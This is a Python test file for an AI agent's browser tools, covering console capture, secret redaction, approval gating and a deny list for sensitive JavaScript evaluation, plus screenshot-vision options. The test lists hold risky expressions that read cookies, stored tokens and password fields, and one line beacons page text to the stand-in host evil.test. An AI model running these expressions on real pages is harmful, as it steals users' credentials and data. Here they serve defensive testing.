"""Tests for browser_console tool and browser_vision annotate param."""

import json
import os
import sys
from unittest.mock import patch, MagicMock

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

LOCAL_SESSION = {"session_name": "h_local", "features": {"local": True}}
CLOUD_SESSION = {
    "session_name": "h_cloud", "bb_session_id": "bb-1",
    "cdp_url": "wss://cloud.test/devtools/browser/abc", "features": {},
}


# ── browser_console ──────────────────────────────────────────────────


class TestBrowserConsole:
    """browser_console() returns console messages + JS errors in one call."""

    def test_returns_console_messages_and_errors(self):
        from tools.browser_tool import browser_console

        console_response = {
            "success": True,
            "data": {
                "messages": [
                    {"text": "hello", "type": "log", "timestamp": 1},
                    {"text": "oops", "type": "error", "timestamp": 2},
                ]
            },
        }
        errors_response = {
            "success": True,
            "data": {
                "errors": [
                    {"message": "Uncaught TypeError", "timestamp": 3},
                ]
            },
        }

        with patch("tools.browser_tool_session._run_browser_command") as mock_cmd:
            mock_cmd.side_effect = [console_response, errors_response]
            result = json.loads(browser_console(task_id="test"))

        assert result["success"] is True
        assert result["total_messages"] == 2
        assert result["total_errors"] == 1
        assert result["console_messages"][0]["text"] == "hello"
        assert result["console_messages"][1]["text"] == "oops"
        assert result["js_errors"][0]["message"] == "Uncaught TypeError"

    def test_passes_clear_flag(self):
        from tools.browser_tool import browser_console

        empty = {"success": True, "data": {"messages": [], "errors": []}}
        with patch("tools.browser_tool_session._run_browser_command", return_value=empty) as mock_cmd:
            browser_console(clear=True, task_id="test")

        calls = mock_cmd.call_args_list
        # Both console and errors should get --clear
        assert calls[0][0] == ("test", "console", ["--clear"])
        assert calls[1][0] == ("test", "errors", ["--clear"])


    def test_redacts_secrets_from_console_messages_and_errors(self):
        from tools.browser_tool import browser_console

        fake_key = "sk-" + "BROWSERCONSOLESECRET1234567890"
        console_response = {
            "success": True,
            "data": {"messages": [{"text": f"token={fake_key}", "type": "log"}]},
        }
        errors_response = {
            "success": True,
            "data": {"errors": [{"message": f"Uncaught auth {fake_key}"}]},
        }
        with patch("tools.browser_tool_session._run_browser_command") as mock_cmd:
            mock_cmd.side_effect = [console_response, errors_response]
            result = json.loads(browser_console(task_id="test"))

        serialized = json.dumps(result)
        # The secret body must be gone. The exact mask format
        # (partial ``sk-…7890`` vs full ``***`` for keyed ``token=`` values)
        # is owned by agent.redact and intentionally not pinned here.
        assert "BROWSERCONSOLESECRET" not in serialized
        redacted_text = result["console_messages"][0]["text"]
        assert fake_key not in redacted_text
        assert "***" in redacted_text or "..." in redacted_text

    def test_redacts_secrets_from_eval_result(self):
        from tools.browser_tool import _browser_eval

        fake_key = "ghp_" + "BROWSEREVALSECRET1234567890"
        with patch("tools.browser_tool._last_session_key", return_value="test"), \
             patch("tools.browser_tool._is_camofox_mode", return_value=False), \
             patch("tools.browser_tool_session.command_session", return_value=(LOCAL_SESSION, None)), \
             patch("tools.browser_tool_session._run_browser_command", return_value={"success": True, "data": {"result": fake_key}}):
            result = json.loads(_browser_eval("document.body.innerText", task_id="test"))

        assert result["success"] is True
        assert "BROWSEREVALSECRET" not in json.dumps(result)
        assert result["result"].startswith("ghp_")


    _RISKY_EXPRESSIONS = [
        "document.cookie",
        "fetch('/api/me')",
        "localStorage.getItem('token')",
        "document.querySelector('input[type=password]').value",
        "document.querySelector('#fetch-results').innerText",
    ]

    def test_local_sidecar_eval_keeps_compatibility_without_approval(self):
        """Local sidecars keep the compatibility behavior: risky expressions run without the approval gate."""
        from tools.browser_tool import browser_console

        with patch("tools.browser_tool._last_session_key", return_value="test"), \
             patch("tools.browser_tool._is_camofox_mode", return_value=False), \
             patch("tools.browser_tool_session.command_session", return_value=(LOCAL_SESSION, None)), \
             patch("tools.browser_tool_session._run_browser_command", return_value={"success": True, "data": {"result": "ok"}}) as run, \
             patch("tools.approval.request_tool_approval", return_value={"approved": True}) as approve:
            for expr in self._RISKY_EXPRESSIONS:
                result = json.loads(browser_console(expression=expr, task_id="test"))
                assert result["success"] is True and result["result"] == "ok", expr

        assert run.call_count == len(self._RISKY_EXPRESSIONS)
        approve.assert_not_called()

    def test_cloud_sensitive_eval_is_approval_gated(self):
        from tools.browser_tool import browser_console

        with patch("tools.browser_tool._last_session_key", return_value="test"), \
             patch("tools.browser_tool._is_camofox_mode", return_value=False), \
             patch("tools.browser_tool_session.command_session", return_value=(CLOUD_SESSION, None)), \
             patch("tools.browser_tool_session._run_browser_command", return_value={"success": True, "data": {"result": "ok"}}) as run, \
             patch("tools.approval.request_tool_approval", return_value={"approved": True}) as approve:
            for expr in self._RISKY_EXPRESSIONS:
                result = json.loads(browser_console(expression=expr, task_id="test"))
                assert result["success"] is True and result["result"] == "ok", expr

        assert approve.call_count == len(self._RISKY_EXPRESSIONS)
        assert run.call_count == len(self._RISKY_EXPRESSIONS)

    def test_sensitive_eval_denial_does_not_execute(self):
        from tools.browser_tool import browser_console
        with patch("tools.browser_tool._last_session_key", return_value="test"), \
             patch("tools.browser_tool._is_camofox_mode", return_value=False), \
             patch("tools.browser_tool_session.command_session", return_value=(CLOUD_SESSION, None)), \
             patch("tools.approval.request_tool_approval", return_value={"approved": False, "message": "denied"}), \
             patch("tools.browser_tool_session._run_browser_command") as run:
            result = json.loads(browser_console(expression="document.cookie", task_id="test"))
        assert result["success"] is False
        assert result["error"] == "denied"
        run.assert_not_called()

    def test_explicit_restrict_evaluate_is_never_approvable(self):
        """An operator's explicit browser.restrict_evaluate is a hard limit, so no approval can override it."""
        from tools.browser_tool import browser_console

        flags = {"restrict_evaluate": True}
        with patch("tools.browser_tool_eval_policy._browser_eval_flag", side_effect=lambda key: flags.get(key, False)), \
             patch("tools.browser_tool._browser_eval") as mock_eval, \
             patch("tools.approval.request_tool_approval", return_value={"approved": True}) as approve:
            result = json.loads(browser_console(expression="document.cookie", task_id="test"))
        assert result["success"] is False
        assert "browser.restrict_evaluate" in result["error"]
        approve.assert_not_called()
        mock_eval.assert_not_called()

    def test_expression_blocks_cookie_access_before_eval(self):
        from tools.browser_tool import browser_console

        # The explicit operator setting is the hard limit: it refuses outright and is never approvable.
        with patch("tools.browser_tool_eval_policy._browser_eval_flag", side_effect=lambda key: key == "restrict_evaluate"), \
             patch("tools.browser_tool._browser_eval") as mock_eval:
            result = json.loads(browser_console(expression="document.cookie", task_id="test"))

        assert result["success"] is False
        assert "Blocked" in result["error"]
        assert "document.cookie" in result["error"]
        mock_eval.assert_not_called()

    def test_expression_blocks_storage_and_network_access_before_eval(self):
        from tools.browser_tool import browser_console

        risky_expressions = [
            "localStorage.getItem('token')",
            "sessionStorage.token",
            "indexedDB.databases()",
            "navigator.clipboard.readText()",
            "fetch('/api/me')",
            "navigator.sendBeacon('https://evil.test', document.body.innerText)",
            "document.querySelector('input[type=password]').value",
        ]
        with patch("tools.browser_tool_eval_policy._browser_eval_flag", side_effect=lambda key: key == "restrict_evaluate"), \
             patch("tools.browser_tool._browser_eval") as mock_eval:
            for expr in risky_expressions:
                result = json.loads(browser_console(expression=expr, task_id="test"))
                assert result["success"] is False, expr
                assert "Blocked" in result["error"], expr

        mock_eval.assert_not_called()


    def test_restrict_evaluate_reads_browser_config(self):
        from tools.browser_tool_eval_policy import _restrict_browser_evaluate

        with patch("hermes_cli.config.read_raw_config", return_value={"browser": {"restrict_evaluate": "true"}}):
            assert _restrict_browser_evaluate() is True
        with patch("hermes_cli.config.read_raw_config", return_value={"browser": {"restrict_evaluate": False}}):
            assert _restrict_browser_evaluate() is False
        # Default (key absent) is off — the denylist is opt-in.
        with patch("hermes_cli.config.read_raw_config", return_value={}), \
             patch("tools.browser_tool_cloud._browser_is_local_sidecar", return_value=True), \
             patch("tools.browser_tool_cloud._use_real_profile", return_value=False):
            assert _restrict_browser_evaluate() is False


class TestEvalJudgesTheRecordItRuns:
    """A dead or suspect record is replaced when the next command runs. The policy judges the record that results and
    the command runs on that same record, so an approval always covers the browser that executes."""

    @pytest.fixture(params=["dead", "suspect"])
    def stale_local_fallback(self, monkeypatch, request):
        """Task ``test`` holds a stale record that fell back from a cloud session to local Chromium: either it died, or a
        command timed out and marked it suspect. A cloud provider is configured, so the replacement is a cloud session.
        Only the teardown and the health probes are stubbed; the replacement logic is the real one."""
        import tools.browser_tool as bt
        import tools.browser_tool_cdp as cdp
        import tools.browser_tool_lifecycle as lifecycle
        import tools.browser_tool_session as session

        monkeypatch.setenv("TERMINAL_ENV", "local")
        registry_key = bt._registry_session_key("test")
        monkeypatch.setitem(bt._active_sessions, registry_key,
                            {"session_name": "h_stale", "features": {"local": True, "fallback_from_cloud": True}})
        if request.param == "suspect":
            monkeypatch.setitem(bt._suspect_browser_sessions, registry_key, "command timed out")
        else:
            monkeypatch.setattr(lifecycle, "_session_has_expired", lambda session_info: True)

        def teardown(key):
            with bt._cleanup_lock:
                bt._active_sessions.pop(key, None)

        monkeypatch.setattr(lifecycle, "_cleanup_single_browser_session", teardown)
        monkeypatch.setattr(bt, "_last_session_key", lambda task_id: task_id)
        monkeypatch.setattr(bt, "_is_camofox_mode", lambda: False)
        monkeypatch.setattr(lifecycle, "_start_browser_cleanup_thread", lambda: None)
        monkeypatch.setattr(lifecycle, "_update_session_activity", lambda key: None)
        monkeypatch.setattr(session, "_browser_command_preflight", lambda: {"browser_cmd": "agent-browser"})
        monkeypatch.setattr(session, "_create_session_for_key",
                            lambda task_id, force_local: dict(CLOUD_SESSION))
        monkeypatch.setattr(cdp, "_ensure_cdp_supervisor", lambda task_id: None)
        return registry_key

    def test_replacement_that_is_cloud_asks_before_anything_runs(self, monkeypatch, stale_local_fallback):
        import tools.browser_tool_session as session
        from tools.browser_tool import browser_console

        asked = []
        monkeypatch.setattr("tools.approval.request_tool_approval",
                            lambda tool, reason, **kw: asked.append(kw.get("rule_key")) or {"approved": False, "message": "denied by user"})
        ran = []
        monkeypatch.setattr(session, "_spawn_and_collect",
                            lambda *a, **kw: ran.append(a) or {"success": True, "data": {"result": "cookie=secret"}})

        result = json.loads(browser_console(expression="document.cookie", task_id="test"))

        assert result["success"] is False and result["error"] == "denied by user"
        assert asked == ["browser_console_sensitive_eval"]
        assert ran == []

    def test_approved_replacement_runs_on_the_record_that_was_judged(self, monkeypatch, stale_local_fallback):
        import tools.browser_tool as bt
        import tools.browser_tool_session as session
        from tools.browser_tool import browser_console

        monkeypatch.setattr("tools.approval.request_tool_approval", lambda tool, reason, **kw: {"approved": True})
        ran_on = []

        def spawn(task_id, session_info, cmd_parts, command, engine, timeout):
            ran_on.append(session_info)
            return {"success": True, "data": {"result": "ok"}}

        monkeypatch.setattr(session, "_spawn_and_collect", spawn)

        result = json.loads(browser_console(expression="document.cookie", task_id="test"))

        judged = bt._active_sessions[stale_local_fallback]
        assert result["success"] is True
        assert judged["session_name"] == "h_cloud"
        assert len(ran_on) == 1 and ran_on[0] is judged


# ── browser_console schema ───────────────────────────────────────────


class TestBrowserConsoleSchema:
    """browser_console is properly registered in the tool registry."""

    def test_schema_in_browser_schemas(self):
        from tools.browser_tool import BROWSER_TOOL_SCHEMAS

        names = [s["name"] for s in BROWSER_TOOL_SCHEMAS]
        assert "browser_console" in names

    def test_schema_has_clear_param(self):
        from tools.browser_tool import BROWSER_TOOL_SCHEMAS

        schema = next(s for s in BROWSER_TOOL_SCHEMAS if s["name"] == "browser_console")
        props = schema["parameters"]["properties"]
        assert "clear" in props
        assert props["clear"]["type"] == "boolean"


class TestBrowserConsoleToolsetWiring:
    """browser_console must be reachable via toolset resolution."""

    def test_in_browser_toolset(self):
        from toolsets import TOOLSETS
        assert "browser_console" in TOOLSETS["browser"]["tools"]


    def test_in_registry(self):
        from tools.registry import registry
        from tools import browser_tool  # noqa: F401
        assert "browser_console" in registry._tools


# ── browser_vision annotate ──────────────────────────────────────────


class TestBrowserVisionAnnotate:
    """browser_vision supports annotate parameter."""

    def test_schema_has_annotate_param(self):
        from tools.browser_tool import BROWSER_TOOL_SCHEMAS

        schema = next(s for s in BROWSER_TOOL_SCHEMAS if s["name"] == "browser_vision")
        props = schema["parameters"]["properties"]
        assert "annotate" in props
        assert props["annotate"]["type"] == "boolean"


    def test_annotate_true_adds_flag(self):
        """With annotate=True, screenshot command includes --annotate."""
        from tools.browser_tool import browser_vision

        with (
            patch("tools.browser_tool_session._run_browser_command") as mock_cmd,
            patch("agent.auxiliary_client.call_llm") as mock_call_llm,
            patch("tools.browser_tool._get_vision_model", return_value="test-model"),
        ):
            mock_cmd.return_value = {"success": True, "data": {}}
            try:
                browser_vision("test", annotate=True, task_id="test")
            except Exception:
                pass

            if mock_cmd.called:
                args = mock_cmd.call_args[0]
                cmd_args = args[2] if len(args) > 2 else []
                assert "--annotate" in cmd_args


class TestBrowserVisionConfig:
    def _setup_screenshot(self, tmp_path):
        shots_dir = tmp_path / "browser_screenshots"
        shots_dir.mkdir()
        screenshot = shots_dir / "shot.png"
        screenshot.write_bytes(b"\x89PNG\r\n\x1a\n" + b"\x00" * 8)
        return shots_dir, screenshot

    def test_browser_vision_uses_configured_temperature_and_timeout(self, tmp_path):
        from tools.browser_tool import browser_vision

        shots_dir, screenshot = self._setup_screenshot(tmp_path)
        mock_response = MagicMock()
        mock_choice = MagicMock()
        mock_choice.message.content = "Annotated screenshot analysis"
        mock_response.choices = [mock_choice]

        with (
            patch("hermes_constants.get_hermes_dir", return_value=shots_dir),
            patch("tools.browser_tool_lifecycle._cleanup_old_screenshots"),
            patch("tools.browser_tool_session._run_browser_command", return_value={"success": True, "data": {"path": str(screenshot)}}),
            patch("tools.browser_tool._get_vision_model", return_value="test-model"),
            patch("hermes_cli.config.load_config", return_value={"auxiliary": {"vision": {"temperature": 1, "timeout": 45}}}),
            patch("agent.auxiliary_client.call_llm", return_value=mock_response) as mock_llm,
        ):
            result = json.loads(browser_vision("what is on the page?", task_id="test"))

        assert result["success"] is True
        assert result["analysis"] == "Annotated screenshot analysis"
        assert mock_llm.call_args.kwargs["temperature"] == 1.0
        assert mock_llm.call_args.kwargs["timeout"] == 45.0
        # No hardcoded output cap — the aux client omits max_tokens so the
        # provider uses its full output budget (max-tokens-knob policy).
        assert "max_tokens" not in mock_llm.call_args.kwargs


    def test_browser_vision_native_fast_path_returns_multimodal(self, tmp_path):
        """supports_vision override → screenshot attached natively, no aux call."""
        from agent.auxiliary_client import clear_runtime_main, set_runtime_main
        from tools.browser_tool import browser_vision

        shots_dir, screenshot = self._setup_screenshot(tmp_path)
        annotations = [{"id": 1, "label": "Search box"}]
        set_runtime_main("brand-new-provider", "llava-v1.6")
        try:
            with (
                patch("hermes_constants.get_hermes_dir", return_value=shots_dir),
                patch("tools.browser_tool_lifecycle._cleanup_old_screenshots"),
                patch(
                    "tools.browser_tool_session._run_browser_command",
                    return_value={
                        "success": True,
                        "data": {"path": str(screenshot), "annotations": annotations},
                    },
                ),
                patch(
                    "hermes_cli.config.load_config",
                    return_value={"model": {"supports_vision": True}},
                ),
                patch("tools.browser_tool._get_vision_model") as mock_get_vision_model,
                patch("agent.auxiliary_client.call_llm") as mock_llm,
            ):
                result = browser_vision("what is on the page?", annotate=True, task_id="test")
        finally:
            clear_runtime_main()

        assert isinstance(result, dict)
        assert result["_multimodal"] is True
        assert result["meta"]["screenshot_path"] == str(screenshot)
        assert result["meta"]["annotations"] == annotations
        assert any(p.get("type") == "image_url" for p in result["content"])
        assert f"Screenshot path: {screenshot}" in result["text_summary"]
        mock_get_vision_model.assert_not_called()
        mock_llm.assert_not_called()

    def test_browser_vision_native_fast_path_caps_history_embed(self, tmp_path):
        """Oversized screenshots are resized before entering history (#92699).

        browser_vision's native fast path bakes the data URL into the tool
        result exactly like vision_analyze — without the proactive resize a
        full-res screenshot rides every later request uncapped.
        """
        pytest.importorskip("PIL")
        import base64
        from io import BytesIO

        from PIL import Image

        from agent.auxiliary_client import clear_runtime_main, set_runtime_main
        from tools.browser_tool import browser_vision
        from tools.vision_tools import _EMBED_MAX_DIMENSION, _EMBED_TARGET_BYTES

        shots_dir = tmp_path / "browser_screenshots"
        shots_dir.mkdir()
        screenshot = shots_dir / "shot.png"
        # Taller than the long-edge cap so the resize path must fire.
        Image.new("RGB", (400, _EMBED_MAX_DIMENSION + 500), (0, 100, 0)).save(
            screenshot, format="PNG"
        )

        set_runtime_main("brand-new-provider", "llava-v1.6")
        try:
            with (
                patch("hermes_constants.get_hermes_dir", return_value=shots_dir),
                patch("tools.browser_tool_lifecycle._cleanup_old_screenshots"),
                patch(
                    "tools.browser_tool_session._run_browser_command",
                    return_value={
                        "success": True,
                        "data": {"path": str(screenshot)},
                    },
                ),
                patch(
                    "hermes_cli.config.load_config",
                    return_value={"model": {"supports_vision": True}},
                ),
                patch("agent.auxiliary_client.call_llm") as mock_llm,
            ):
                result = browser_vision("what is on the page?", task_id="test")
        finally:
            clear_runtime_main()

        assert isinstance(result, dict)
        assert result["_multimodal"] is True
        url = next(
            p["image_url"]["url"]
            for p in result["content"]
            if p.get("type") == "image_url"
        )
        assert len(url) <= _EMBED_TARGET_BYTES, (
            f"embedded browser screenshot {len(url) / 1024:.0f} KB exceeds the "
            f"history-reuse cap {_EMBED_TARGET_BYTES / 1024:.0f} KB"
        )
        with Image.open(BytesIO(base64.b64decode(url.partition(",")[2]))) as img:
            assert max(img.size) <= _EMBED_MAX_DIMENSION
        mock_llm.assert_not_called()

    def test_browser_vision_text_mode_blocks_native_fast_path(self, tmp_path):
        """Explicit text routing → aux LLM used even with supports_vision."""
        from agent.auxiliary_client import clear_runtime_main, set_runtime_main
        from tools.browser_tool import browser_vision

        shots_dir, screenshot = self._setup_screenshot(tmp_path)
        mock_response = MagicMock()
        mock_choice = MagicMock()
        mock_choice.message.content = "Text-mode screenshot analysis"
        mock_response.choices = [mock_choice]

        set_runtime_main("brand-new-provider", "llava-v1.6")
        try:
            with (
                patch("hermes_constants.get_hermes_dir", return_value=shots_dir),
                patch("tools.browser_tool_lifecycle._cleanup_old_screenshots"),
                patch(
                    "tools.browser_tool_session._run_browser_command",
                    return_value={"success": True, "data": {"path": str(screenshot)}},
                ),
                patch(
                    "hermes_cli.config.load_config",
                    return_value={
                        "agent": {"image_input_mode": "text"},
                        "model": {"supports_vision": True},
                    },
                ),
                patch("tools.browser_tool._get_vision_model", return_value="test-model"),
                patch("agent.auxiliary_client.call_llm", return_value=mock_response) as mock_llm,
            ):
                result = json.loads(browser_vision("what is on the page?", task_id="test"))
        finally:
            clear_runtime_main()

        assert result["success"] is True
        assert result["analysis"] == "Text-mode screenshot analysis"
        mock_llm.assert_called_once()


# ── auto-recording config ────────────────────────────────────────────


class TestRecordSessionsConfig:
    """browser.record_sessions config option."""

    def test_default_config_has_record_sessions(self):
        from hermes_cli.config import DEFAULT_CONFIG

        browser_cfg = DEFAULT_CONFIG.get("browser", {})
        assert "record_sessions" in browser_cfg
        assert browser_cfg["record_sessions"] is False


    def test_maybe_stop_recording_noop_when_not_recording(self):
        """Stopping when not recording is a no-op."""
        from tools.browser_tool import _maybe_stop_recording, _recording_sessions

        _recording_sessions.discard("test-task")  # ensure not in set
        with patch("tools.browser_tool_session._run_browser_command") as mock_cmd:
            _maybe_stop_recording("test-task")

        mock_cmd.assert_not_called()


# ── dogfood skill files ──────────────────────────────────────────────


class TestDogfoodSkill:
    """Dogfood skill files exist and have correct structure."""

    @pytest.fixture(autouse=True)
    def _skill_dir(self):
        # Use the actual repo skills dir (not temp)
        self.skill_dir = os.path.join(
            os.path.dirname(__file__), "..", "..", "skills", "software-development", "dogfood"
        )

    def test_skill_md_exists(self):
        assert os.path.exists(os.path.join(self.skill_dir, "SKILL.md"))

    def test_taxonomy_exists(self):
        assert os.path.exists(
            os.path.join(self.skill_dir, "references", "issue-taxonomy.md")
        )


    def test_taxonomy_has_categories(self):
        with open(
            os.path.join(self.skill_dir, "references", "issue-taxonomy.md")
        ) as f:
            content = f.read()
        assert "Functional" in content
        assert "Visual" in content
        assert "Accessibility" in content
        assert "Console" in content
